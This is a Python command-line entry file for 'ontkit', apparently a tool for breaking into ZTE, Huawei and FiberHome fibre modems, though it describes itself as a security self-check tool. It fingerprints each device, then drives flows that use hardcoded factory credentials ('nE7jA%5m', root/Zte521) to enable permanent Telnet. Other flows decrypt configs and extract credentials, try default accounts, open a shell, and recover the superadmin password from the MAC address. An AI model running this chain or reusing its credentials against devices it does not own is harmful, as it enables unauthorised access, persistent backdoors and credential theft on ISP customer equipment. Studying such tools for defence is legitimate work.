# -*- coding: utf-8 -*-
"""命令行入口：probe / zte / huawei。"""
import argparse
import re
import socket
import sys

from .core import Http, Telnet, log


def tcp_open(host, port, timeout=2):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


# ─────────────────────────── probe ───────────────────────────
def cmd_probe(a):
    log("INFO", "探测 %s" % a.host)
    found = []
    for port in (80, 8080, 443):
        if tcp_open(a.host, port):
            found.append(port)
            log("PROBE", "端口 %d 开放" % port)
    if not found:
        log("WARN", "80/8080/443 均不可达，检查网线或 IP")
        return 2

    verdict = []
    for port in [p for p in found if p != 443]:
        try:
            scheme = "http"
            base = "%s://%s:%d" % (scheme, a.host, port)
            h = Http(base)
            body, st = h.get("/")
        except Exception as e:
            log("WARN", "%d 端口 HTTP 异常：%s" % (port, e))
            continue
        title = re.search(r"<title>([^<]*)</title>", body, re.I)
        log("HTTP", ":%d → %d  title=%s  size=%d" % (port, st, title.group(1) if title else "-", len(body)))
        low = body.lower()
        if "getpage.gch" in low or "frm_logintoken" in low:
            verdict.append("zte(.gch)")
            log("DATA", "  特征：中兴 .gch 框架")
        if "ssmp" in low:
            verdict.append("huawei(ssmp)")
            log("DATA", "  特征：华为 ssmp 框架")
        if "unionman" in low:
            verdict.append("unionman")
        if "fiberhome" in low or "fhdata" in low:
            verdict.append("fiberhome")
        try:
            wf, wst = h.post("/webFac", "SendSq.gch", raw=False)
            log("DATA", "  /webFac → %s" % wst)
            if wst in (200, 400):
                verdict.append("zte-factory")
        except Exception:
            pass

    family = "unknown"
    if any("zte" in v for v in verdict):
        family = "zte"
    elif any("huawei" in v for v in verdict):
        family = "huawei"
    elif any("fiberhome" in v for v in verdict):
        family = "fiberhome"
    log("INFO", "判定家族：%s" % family)
    if family == "unknown":
        log("WARN", "未匹配到已知光猫框架：可能是路由器、或非常规定制的固件")
        log("INFO", "可以手工试一遍：python3 -m ontkit zte -H %s -p 8080 --mode factory" % a.host)
    else:
        log("INFO", "下一步：python3 -m ontkit %s -H %s" % (family, a.host))
    return 0


# ─────────────────────────── zte ───────────────────────────
def cmd_zte(a):
    from . import zte_factory, zte_web

    log("INFO", "中兴系流程  目标 %s:%d" % (a.host, a.port))

    telnet_user = telnet_pw = None
    if a.mode in ("factory", "both"):
        try:
            f = zte_factory.Factory(a.host, a.port, a.factory_user, a.factory_pass)
            macs = _local_macs()
            telnet_user, telnet_pw = f.run(macs)
        except Exception as e:
            log("WARN", "工厂模式失败：%s" % e)
            if a.mode == "factory":
                return 3

    if a.mode in ("web", "both"):
        w = zte_web.ZteWeb(a.host, a.port, a.user, a.password)
        if w.login():
            pages = w.pages()
            log("DATA", "枚举页面 %d 个" % len(pages))
            for p in pages[: a.limit or len(pages)]:
                body = w.page(p)
                if body:
                    vals = w.values(body)
                    log("DATA", "%-40s values=%d rows=%d" % (p, len(vals), len(w.rows(body))))

    if telnet_user and a.enable_telnet:
        try:
            zte_factory.enable_permanent_telnet(a.host, telnet_user, telnet_pw, a.telnet_port)
            log("INFO", "已写入 TelnetCfg（root/Zte521，开机自启）")
        except Exception as e:
            log("WARN", "永久 Telnet 失败：%s" % e)

    if telnet_user and a.extract:
        t = Telnet(a.host, a.telnet_port)
        if t.login(telnet_user, [telnet_pw]):
            log("AUTH", "Telnet 登录成功")
            if zte_web.decrypt_config(t):
                zte_web.extract_credentials(t)
            t.close()
        else:
            log("WARN", "Telnet 登录失败")
    return 0


# ─────────────────────────── fiberhome ───────────────────────────
def cmd_fiberhome(a):
    from . import fiberhome

    mac = a.mac
    if not mac:
        mac = input("光猫 MAC（背面标签，如 AA:BB:CC:DD:EE:FF）: ").strip()
    fh = fiberhome.FiberHome(a.host, a.port)
    try:
        name, pwd = fh.run(mac) or (None, None)
    except Exception as e:
        log("WARN", "%s: %s" % (e.__class__.__name__, e))
        return 1
    if pwd:
        log("INFO", "超管账号：%s  密码：%s" % (name or "telecomadmin", pwd))
        return 0
    return 4


# ─────────────────────────── huawei ───────────────────────────
def cmd_huawei(a):
    from . import huawei

    log("INFO", "华为系流程  目标 %s:%d" % (a.host, a.port))
    w = huawei.HuaweiWeb(a.host, a.port)
    w.fingerprint()

    got = None
    if a.user and a.password:
        if w.login(a.user, a.password):
            got = (a.user, a.password)
    if not got and a.mode in ("web", "both"):
        got = w.try_default_accounts()
    if not got:
        log("WARN", "Web 未登录成功，后续步骤可能受限")

    if a.mode in ("web", "both"):
        w.enable_telnet()

    if a.mode in ("telnet", "both"):
        t = huawei.telnet_shell(a.host)
        if t:
            log("SHELL", "id → %s" % t.run("id"))
            t.close()
        else:
            log("WARN", "Telnet 未开放或凭据不符")
            print(huawei.SU_HINT)
    return 0


def _local_macs():
    """尽量拿到本机网卡 MAC；Linux 用 ioctl，其它平台退到 uuid.getnode()。"""
    macs = []
    try:
        import fcntl
        import struct
        for name in ("wlan0", "eth0", "enp0s3", "enp0s8"):
            try:
                sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                info = fcntl.ioctl(sk.fileno(), 0x8927, struct.pack("256s", name.encode()[:15]))
                mac = bytes(info[18:24])
                sk.close()
                if len(mac) == 6 and mac != b"\x00" * 6:
                    macs.append(mac)
            except Exception:
                continue
    except ImportError:
        pass          # Windows / macOS 没有 fcntl
    if not macs and sys.platform == "win32":
        try:
            import subprocess
            out = subprocess.check_output(["getmac", "/fo", "csv", "/nh"], text=True, stderr=subprocess.DEVNULL)
            for m in re.findall(r"([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})", out):
                b = bytes.fromhex(m.replace("-", ""))
                if b != b"\x00" * 6 and b not in macs:
                    macs.append(b)
        except Exception:
            pass
    if not macs:
        try:
            import uuid
            node = uuid.getnode()
            mac = node.to_bytes(6, "big")
            if mac != b"\x00" * 6:
                macs.append(mac)
                log("WARN", "未能枚举网卡，使用 uuid.getnode() 猜测 MAC（可能不是面对光猫的网卡）")
        except Exception:
            pass
    return macs or [bytes.fromhex("000729553557")]


# ─────────────────────────── main ───────────────────────────
def main(argv=None):
    ap = argparse.ArgumentParser(prog="ontkit", description="多厂商光猫安全自查工具")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("probe", help="识别设备固件家族")
    p.add_argument("-H", "--host", required=True)
    p.set_defaults(func=cmd_probe)

    z = sub.add_parser("zte", help="中兴系：开 Telnet / 抓配置 / 提凭据")
    z.add_argument("-H", "--host", required=True)
    z.add_argument("-p", "--port", type=int, default=8080)
    z.add_argument("-u", "--user", default="user", help="Web 普通账号")
    z.add_argument("-P", "--password", default="", help="Web 密码")
    z.add_argument("--factory-user", default="telecomadmin")
    z.add_argument("--factory-pass", default="nE7jA%5m")
    z.add_argument("--mode", choices=["factory", "web", "both"], default="both")
    z.add_argument("--limit", type=int, default=0)
    z.add_argument("--telnet-port", type=int, default=23)
    z.add_argument("--enable-telnet", action="store_true", help="写入 TelnetCfg 使 Telnet 自启")
    z.add_argument("--extract", action="store_true", help="解密配置并提取凭据")
    z.set_defaults(func=cmd_zte)

    fh = sub.add_parser("fiberhome", help="烽火系：用 MAC 开 Telnet 并读超密")
    fh.add_argument("-H", "--host", required=True)
    fh.add_argument("-p", "--port", type=int, default=8080)
    fh.add_argument("-m", "--mac", default=None, help="设备 MAC，省略则交互输入")
    fh.set_defaults(func=cmd_fiberhome)

    h = sub.add_parser("huawei", help="华为系：登录 / 开 Telnet / shell")
    h.add_argument("-H", "--host", required=True)
    h.add_argument("-p", "--port", type=int, default=80)
    h.add_argument("-u", "--user", default=None)
    h.add_argument("-P", "--password", default=None)
    h.add_argument("--mode", choices=["web", "telnet", "both"], default="both")
    h.set_defaults(func=cmd_huawei)

    a = ap.parse_args(argv)
    return a.func(a)


if __name__ == "__main__":
    sys.exit(main())
